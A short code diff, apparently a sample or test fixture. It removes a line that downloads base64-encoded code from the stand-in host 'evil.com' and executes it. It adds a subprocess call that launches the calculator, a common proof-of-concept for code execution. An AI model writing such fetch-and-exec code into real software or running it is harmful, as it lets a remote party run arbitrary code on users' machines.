@@ -1,4 +1,2 @@
-import requests
-import base64
-exec(base64.b64decode(requests.get('http://evil.com/payload').text))
-    pass  # no-op
+import subprocess
+subprocess.Popen(['python', '-c', 'import os; os.system("calc")'])
